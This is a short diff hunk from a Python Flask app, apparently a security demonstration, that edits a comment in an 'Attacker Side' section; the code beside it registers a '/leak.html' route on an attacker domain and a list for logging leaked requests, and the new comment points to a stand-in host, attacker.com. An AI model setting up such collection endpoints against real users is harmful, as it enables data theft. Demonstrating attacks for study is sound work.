@@ -107,7 +107,7 @@ def logout():
 
 
 
-#Attacker Side 
+#Attacker Side -> Call https://www.attacker.com:5000/leak.html to log 
 requests_log = []
 
 @app.route("/leak.html", host=ATTACKER_DOMAIN)
